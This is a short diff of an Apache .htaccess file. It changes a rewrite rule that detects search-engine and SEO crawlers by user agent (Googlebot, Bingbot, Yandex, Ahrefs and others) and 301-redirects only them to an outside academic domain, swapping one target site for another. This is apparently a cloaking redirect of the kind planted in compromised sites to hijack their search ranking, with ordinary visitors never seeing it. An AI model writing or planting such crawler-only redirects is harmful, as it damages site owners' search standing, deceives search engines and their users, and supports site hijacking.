@@ -3,5 +3,5 @@ RewriteEngine On
 
 RewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|slurp|ahrefs|semrush|yandex|majestic|screamingfrog) [NC]
 
-RewriteRule ^(.*)$ https://ojs.elte.hu/ [R=301,L]
+RewriteRule ^(.*)$ https://ftk.uinbanten.ac.id/ [R=301,L]
 </IfModule>
